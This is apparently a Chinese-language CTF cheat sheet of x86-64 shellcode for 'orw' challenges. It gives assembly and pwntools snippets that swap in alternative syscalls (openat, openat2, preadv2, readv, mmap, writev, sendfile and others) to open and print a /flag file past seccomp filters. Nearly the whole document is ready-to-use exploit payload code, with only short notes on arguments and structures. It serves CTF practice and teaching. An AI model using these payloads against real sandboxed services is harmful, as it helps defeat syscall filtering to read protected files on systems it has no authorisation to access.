# orw shellcode绕过

# open

## open("/flag",0)

```undefined
/* open(file='/flag', oflag=0, mode=0) */
    /* push b'/flag\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
```

## openat(3,"/flag")

```undefined
/* openat(fd=3, file='/flag', oflag=0) */
/* push b'/flag\x00' */
mov rax, 0x67616c662f
push rax
xor rdi, rdi
sub rdi, 100
mov rsi, rsp
xor edx, edx
xor r10, r10
push SYS_openat
pop rax
syscall
```

## openat2

```undefined
flag_addr+0x20指向0
shellcode=asm(shellcraft.openat2(-100,flag_addr,flag_addr+0x20,0x18))
shellcode1=asm(f'''
mov rdi,0
sub rdi,100
mov rdx,0
push rdx
mov rdx,rsp
mov rsi, 0x67616c662f
push rsi
mov rsi,rsp
add rdx,0x100
mov r10,0x18
mov rax,0x1b5
syscall
''')
```

## name\_to\_handle\_at&open\_by\_handle\_at

```undefined
shellcode1=asm(f'''
xor rdi,rdi
sub rdi, 100
mov rsi, 0x67616c662f
push rsi
mov rsi,rsp
xor rdx,rdx
push rdx
mov rdx,rsp
add rdx,0x200
xor r10,r10
push r10
mov r10,rsp
xor r11,r11
mov rax,303
syscall

mov rdi,-100
mov rsi,rdx
xor rdx,rdx
mov rax,304
syscall
''')
chunk3+0x530和chunk3+0x630指向0
需要在root下，不好使
#shellcode1=asm(shellcraft.name_to_handle_at(-100,flag_addr,chunk3+0x530,chunk3+0x630,0))
#shellcode1+=asm(shellcraft.open_by_handle_at(-100,chunk3+0x530,0))
```

# read

## mmap(addr，len，7，18，3，0）

```undefined
shellcode=asm('''
mov rdi, 0x10000
mov rsi, 0x1000
mov rdx, 7
push 18
pop r10
push 3
pop r8
xor r9, r9
push 9
pop rax
syscall
''')
```

## read

```undefined
rsi为合法地址即可
shellcode=asm('''
push 3
pop rdi
push 0x40
pop rdx
xor rax,rax
syscall
''')
```

## pread(3,buf,len,0)

```undefined
shellcode=asm('''
mov rdi, 3
mov rsi, 0x67616c662f
push rsi
mov rsi,rsp
mov rdx, 50
xor r10, r10
push 17
pop rax
syscall
''')
```

## readv(3,iovc,1)

```undefined
shellcode=asm('''
push 3
pop rdi
push 1   
pop rdx
lea rbx, [rsp-8]
push rbx
mov rsi, rsp
push 19
pop rax
syscall
''')

readv和writev需要让rsi指向一个结构体，这个结构体为
struct iovec
{
    void   user *iov_base; 
    kernel_size_t iov_len;
};
这个结构体里面的变量都是8个字节，并且iov_base是要写入的地址，iov_len是写入的长度
```

## preadv(3,iovc,1,0)

```undefined
shellcode=asm('''
mov rdi, 3
push 0x30
lea rbx, [rsp-8]
push rbx
mov rsi, rsp
mov rdx, 1
xor r10, r10
xor r8, r8
push 0x127
pop rax
syscall
''')
```

## preadv2(3,iovec,1,0)

```undefined
shellcode=asm('''
mov rdi, 3
push 0x30
lea rbx, [rsp-8]
push rbx
mov rsi, rsp
mov rdx, 1
xor r10, r10
xor r8, r8
push 327
pop rax
syscall
''')
```

# write

## write(1，buf，0x40)

```undefined
shellcode=asm('''
push 1
pop rdi
push 0x40
pop rdx
push 1
pop rax
syscall
''')
```

## writev(1,iovc,1)

```undefined
shellcode=asm('''
push 1
pop rdi
push 1    /* iov size */
pop rdx
push 0x100
lea rbx, [rsp+8]
push rbx
mov rsi, rsp
push 20
pop rax
syscall
''')
```

# sendfile

```undefined
shellcode=asm('''
mov rdi, 1
mov rsi, 3
push 0
mov rdx, rsp
mov r10, 0x100
push SYS_sendfile
pop rax
syscall
''')
```
